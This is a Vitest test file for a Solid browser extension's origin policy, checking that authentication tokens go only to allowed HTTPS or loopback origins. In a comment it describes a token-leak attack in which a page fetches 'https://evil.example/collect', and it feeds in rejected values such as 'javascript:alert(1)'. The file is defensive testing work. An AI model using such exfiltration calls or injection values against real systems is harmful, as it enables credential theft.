// AUTHORED-BY Claude Opus 4.8
import { describe, expect, it } from 'vitest';
import {
  computeAllowedOrigins,
  isLoopbackHost,
  isOriginAllowed,
  isTokenEndpoint,
  isValidClientIdUrl,
} from '../src/background/core/origin-policy';

describe('computeAllowedOrigins', () => {
  it('includes the WebID origin and issuer origin by default', () => {
    const allowed = computeAllowedOrigins({
      webId: 'https://alice.pod.example/profile/card#me',
      issuer: 'https://idp.example/',
    });
    expect(allowed.has('https://alice.pod.example')).toBe(true);
    expect(allowed.has('https://idp.example')).toBe(true);
  });

  it('includes explicit pod origins (pod on a different host than the WebID)', () => {
    const allowed = computeAllowedOrigins({
      webId: 'https://alice.id.example/card#me',
      podOrigins: ['https://storage.example/alice/'],
    });
    expect(allowed.has('https://storage.example')).toBe(true);
  });

  it('DROPS a cleartext http origin (cleartext guard) by default', () => {
    const allowed = computeAllowedOrigins({
      webId: 'http://alice.pod.example/card#me',
    });
    expect(allowed.size).toBe(0);
  });

  it('allows http ONLY for loopback when allowInsecureLoopback is set', () => {
    const allowed = computeAllowedOrigins({
      webId: 'http://localhost:3000/alice/card#me',
      allowInsecureLoopback: true,
    });
    expect(allowed.has('http://localhost:3000')).toBe(true);

    const rejected = computeAllowedOrigins({
      webId: 'http://evil.example/card#me',
      allowInsecureLoopback: true,
    });
    expect(rejected.size).toBe(0); // loopback-only, not any http
  });

  it('can exclude the WebID / issuer origins', () => {
    const allowed = computeAllowedOrigins({
      webId: 'https://alice.pod.example/card#me',
      issuer: 'https://idp.example/',
      includeWebIdOrigin: false,
      includeIssuerOrigin: false,
    });
    expect(allowed.size).toBe(0);
  });

  it('yields an EMPTY set when nothing is supplied (fail-closed)', () => {
    expect(computeAllowedOrigins({}).size).toBe(0);
  });
});

describe('isOriginAllowed — the per-request credential gate', () => {
  const allowed = computeAllowedOrigins({
    webId: 'https://alice.pod.example/card#me',
    issuer: 'https://idp.example/',
  });

  it('allows a request to an allowed origin', () => {
    expect(isOriginAllowed(allowed, 'https://alice.pod.example/private/notes.ttl')).toBe(true);
  });

  it('FAILS CLOSED: rejects a foreign origin (the token-leak attack)', () => {
    // The core security property: a malicious page calling
    // solid.fetch("https://evil.example/collect") must NOT get the token.
    expect(isOriginAllowed(allowed, 'https://evil.example/collect')).toBe(false);
  });

  it('rejects an unparseable URL', () => {
    expect(isOriginAllowed(allowed, 'not a url')).toBe(false);
  });

  it('rejects everything when the allowed set is empty', () => {
    expect(isOriginAllowed(new Set(), 'https://alice.pod.example/x')).toBe(false);
  });

  it('treats a port difference as a different origin', () => {
    expect(isOriginAllowed(allowed, 'https://alice.pod.example:8443/x')).toBe(false);
  });
});

describe('isTokenEndpoint — never attach the resource token to /token', () => {
  it('matches the token endpoint by origin + path, ignoring query', () => {
    const ep = 'https://idp.example/oidc/token';
    expect(isTokenEndpoint('https://idp.example/oidc/token?x=1', ep)).toBe(true);
  });

  it('does not match a different path on the same origin', () => {
    const ep = 'https://idp.example/oidc/token';
    expect(isTokenEndpoint('https://idp.example/oidc/userinfo', ep)).toBe(false);
  });

  it('returns false when no token endpoint is known', () => {
    expect(isTokenEndpoint('https://idp.example/oidc/token', null)).toBe(false);
  });
});

describe('isLoopbackHost', () => {
  it.each(['localhost', '127.0.0.1', '[::1]', '::1', 'LOCALHOST'])('treats %s as loopback', (h) => {
    expect(isLoopbackHost(h)).toBe(true);
  });
  it('treats a real host as non-loopback', () => {
    expect(isLoopbackHost('evil.example')).toBe(false);
  });
});

describe('isValidClientIdUrl — page-declared client-id transport guard', () => {
  it('accepts an https client-id document URL', () => {
    expect(isValidClientIdUrl('https://app.example/client-id.jsonld')).toBe(true);
  });
  it('accepts http only for a loopback host (dev)', () => {
    expect(isValidClientIdUrl('http://localhost:8080/client-id')).toBe(true);
    expect(isValidClientIdUrl('http://127.0.0.1:8080/client-id')).toBe(true);
  });
  it('REJECTS a remote plaintext http client-id (tamperable in transit)', () => {
    expect(isValidClientIdUrl('http://evil.example/client-id')).toBe(false);
  });
  it('rejects a non-http(s) scheme and an unparseable value', () => {
    expect(isValidClientIdUrl('ftp://x/client-id')).toBe(false);
    expect(isValidClientIdUrl('javascript:alert(1)')).toBe(false);
    expect(isValidClientIdUrl('not a url')).toBe(false);
  });
});
